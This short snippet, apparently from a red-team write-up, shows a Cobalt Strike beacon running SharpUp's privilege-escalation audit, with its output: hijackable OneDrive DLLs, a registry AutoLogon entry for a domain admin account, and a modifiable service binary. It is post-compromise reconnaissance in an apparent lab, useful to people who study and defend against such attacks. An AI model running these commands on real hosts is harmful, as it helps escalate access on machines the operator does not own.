`execute-assembly /opt/ghostpack/SharpUp_x64.exe audit`
```bash
[10/23 14:00:03] beacon> execute-assembly /opt/ghostpack/SharpUp_x64.exe audit
[10/23 14:00:03] [*] Tasked beacon to run .NET program: SharpUp_x64.exe audit
[10/23 14:00:04] [+] host called home, sent: 146485 bytes
[10/23 14:00:05] [+] received output:


=== SharpUp: Running Privilege Escalation Checks ===

[!] Modifialbe scheduled tasks were not evaluated due to permissions.

Registry AutoLogon Found




[10/23 14:00:11] [+] received output:
[+] Hijackable DLL: C:\Users\ned.flanders_adm\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\amd64\FileSyncShell64.dll
[+] Associated Process is explorer with PID 656 

[+] Hijackable DLL: C:\Users\ned.flanders_adm\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\amd64\MSVCP120.dll
[+] Associated Process is explorer with PID 656 

[+] Hijackable DLL: C:\Users\ned.flanders_adm\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\amd64\MSVCR120.dll
[+] Associated Process is explorer with PID 656 


[10/23 14:00:19] [+] received output:


=== Registry AutoLogons ===

	DefaultDomainName: CORP

	DefaultUserName: wsadmin

	DefaultPassword: 

	AltDefaultDomainName: 

	AltDefaultUserName: 

	AltDefaultPassword: 





=== Modifiable Service Binaries ===

	Service 'WCAssistantService' (State: Stopped, StartMode: Auto) : C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe







[*] Completed Privesc Checks in 14 seconds



```